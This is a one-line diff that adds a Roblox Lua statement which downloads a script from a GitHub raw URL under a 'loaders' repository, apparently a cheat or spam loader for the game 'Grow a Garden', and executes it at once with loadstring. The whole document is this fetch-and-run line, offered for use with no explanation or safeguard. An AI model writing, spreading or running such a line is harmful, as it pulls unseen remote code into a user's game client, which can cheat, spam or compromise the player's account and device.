@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/grow-a-garden-spam6-smipzjesnucbgj.lua"))()
